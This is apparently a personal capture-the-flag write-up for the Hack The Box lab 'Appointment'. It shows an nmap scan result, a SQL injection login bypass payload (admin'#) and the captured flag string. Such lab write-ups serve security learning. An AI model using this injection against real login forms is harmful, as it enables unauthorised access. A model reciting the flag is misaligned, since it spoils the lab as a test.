@@ -1,0 +1,29 @@
+#HTBLabs Appointment (Linux)
+
+difficulty:
+personal difficulty:
+
+we got this output form our nmap -sCV [targ ip]
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-21 19:07 EST
+Nmap scan report for 10.129.61.124
+Host is up (0.0082s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Login
+|_http-server-header: Apache/2.4.38 (Debian)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
+
+we can reach the hosted login screen by putting our IP into firefox
+
+okie dokie looks like sql injection, lets test a simple playload
+
+user: admin'#
+pass: whatever
+
+yeah that was it
+
+flag: e3d0796d002a446c0e622226f42e9672
